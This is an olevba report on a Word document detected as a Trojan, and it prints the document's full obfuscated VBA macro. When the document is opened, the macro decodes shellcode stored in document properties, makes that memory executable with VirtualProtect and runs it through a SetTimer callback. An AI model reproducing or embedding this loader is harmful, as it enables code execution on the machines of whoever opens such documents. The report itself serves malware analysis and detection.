olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-377bce72ddbe11aab7c9d0a949909ecb34eb7cf2f5b442c8dd44ac37e1381c2c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-377bce72ddbe11aab7c9d0a949909ecb34eb7cf2f5b442c8dd44ac37e1381c2c - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function WagonmakerSensorAntichreses Lib "user32" Alias "SetTimer" (ByVal TenuitiesBedquilts As LongPtr, ByVal AnapsidanRelieveNoninstitutional As LongPtr, ByVal WoopsUnrefulgentUncoaxial As LongPtr, ByVal DigerentHalvaner As LongPtr) As LongPtr
Private Declare PtrSafe Function StibethylCalgaryDeforester Lib "user32" Alias "KillTimer" (ByVal FrostinessSubstandardHorseload As LongPtr, ByVal OfferingPropodiumPaniquitan As LongPtr) As LongPtr
Private Declare PtrSafe Function AnaboPrecollusionShrinky Lib "kernel32" Alias "VirtualProtect" (ByVal KickxiaMeritorious As LongPtr, ByVal NuculaniaTrichoglossidae As LongPtr, ByVal NoncontemplativelyCumuleneDichroiscope As LongPtr, CalvariasSkaldTreponemiatic As LongPtr) As LongPtr
#Else
Private Declare Function WagonmakerSensorAntichreses Lib "user32" Alias "SetTimer" ( ByVal RefractionateUnguardInrol As Long, ByVal LernaeidaeUnrestedReceipter As Long, ByVal HomericHusbands As Long, ByVal CritiquingInsnared As Any) As Long
Private Declare Function StibethylCalgaryDeforester Lib "user32" Alias "KillTimer" ( ByVal CraniognomyFicaries As Long, ByVal DefiladePoechoricUnprimitivistic As Long) As Long
Private Declare Function AnaboPrecollusionShrinky Lib "kernel32" Alias "VirtualProtect"  (ByVal TeleguFungible As Long, ByVal SubsensuousAllegorisation As Long, ByVal ToxicosesUnthistle As Long, StepdownsParagonimiasis As Long) As Long
#End If
Private Sub Document_Open()
Dim SlishUncoveredDevonport() As Byte
#If Win64 Then
SlishUncoveredDevonport = EverduringSmudging(ActiveDocument.BuiltInDocumentProperties(PInGmvH6("tIEUyKLgR")).Value)
#Else
SlishUncoveredDevonport = EverduringSmudging(ActiveDocument.BuiltInDocumentProperties(PInGmvH6("TOl9QIkQ")).Value)
#End If
#If VBA7 Then
Dim OverwildnessJacktanShawling As LongPtr
Dim NonentriesDaturicNonrestriction As LongPtr
Dim shellCode As LongPtr
Dim TruncheoningMeniscoidal As LongPtr
#Else
Dim OverwildnessJacktanShawling As Long
Dim NonentriesDaturicNonrestriction As Long
Dim shellCode As Long
Dim TruncheoningMeniscoidal As Long
#End If
NonentriesDaturicNonrestriction = UBound(SlishUncoveredDevonport) + 1
shellCode = VarPtr(SlishUncoveredDevonport(0))
AnaboPrecollusionShrinky shellCode, NonentriesDaturicNonrestriction, 64, VarPtr(OverwildnessJacktanShawling)
GetObject(PInGmvH6("LAtiBgNZVR")).Environment(PInGmvH6("nYqRLk4Zad"))(PInGmvH6("vSs8KLo")) = ActiveDocument.FullName
GetObject(PInGmvH6("sUQANvrS4Bp")).Environment(PInGmvH6("rQZHHYqy"))(PInGmvH6("TYQvLrKQy")) = PInGmvH6("qWuDF4JAB5l4")
TruncheoningMeniscoidal = WagonmakerSensorAntichreses(0, shellCode, 1, shellCode)
BuhlbuhlAmoebianEthanedithiol 1
StibethylCalgaryDeforester 0, TruncheoningMeniscoidal
GetObject(PInGmvH6("BFkk_f5RWwp_")).Environment(PInGmvH6("nkg51bAXi5")).Remove (PInGmvH6("JQtiCoCNrdf"))
GetObject(PInGmvH6("cXUi4xGxg")).Environment(PInGmvH6("crH1LLRp")).Remove (PInGmvH6("Q7b9oZ"))
ReDim SlishUncoveredDevonport(1)
End Sub
Sub BuhlbuhlAmoebianEthanedithiol(Finish)
Dim MayhemsLeptocephaliaLawyerism As Long
Dim NonsentientDrawbeamOdontoglossate As Long
NonsentientDrawbeamOdontoglossate = Timer() + (Finish)
Do
MayhemsLeptocephaliaLawyerism = Timer()
DoEvents
Loop Until MayhemsLeptocephaliaLawyerism > NonsentientDrawbeamOdontoglossate
End Sub
Public Function PInGmvH6(strInput)
PInGmvH6 = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function AbaticHaughtiest(TantalizesTeamingMegacoulomb, PentapodiesNondefenseReconsiders)
AbaticHaughtiest = Mid(TantalizesTeamingMegacoulomb, PentapodiesNondefenseReconsiders + 1, 1)
End Function
Function PalatomaxillarySensitized(EpioticAboon) As Long
If Int(Rnd(23)) > 2 Then
PalatomaxillarySensitized = 9000
Else
PalatomaxillarySensitized = Len(EpioticAboon)
End If
End Function
Function EverduringSmudging(PistolAllotteesArthrodonteae)
ReDim ShopfulMoonseedOrangeado(PalatomaxillarySensitized(PistolAllotteesArthrodonteae) - 1) As Byte
Dim AkoulalionSonnetising As Long, CoelelminthicSpirituelle As Long
Dim IsolinePrecompletenessNonspirituous: IsolinePrecompletenessNonspirituous = PInGmvH6("fghBtdyIxDe_D") & PInGmvH6("mt6ANHuy3Qv")
For AkoulalionSonnetising = 0 To PalatomaxillarySensitized(PistolAllotteesArthrodonteae) - 1 Step 2
CoelelminthicSpirituelle = AkoulalionSonnetising / 2
ShopfulMoonseedOrangeado(CoelelminthicSpirituelle) = CDec(IsolinePrecompletenessNonspirituous & AbaticHaughtiest(PistolAllotteesArthrodonteae, AkoulalionSonnetising) & AbaticHaughtiest(PistolAllotteesArthrodonteae, AkoulalionSonnetising + 1))
Next
EverduringSmudging = ShopfulMoonseedOrangeado
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

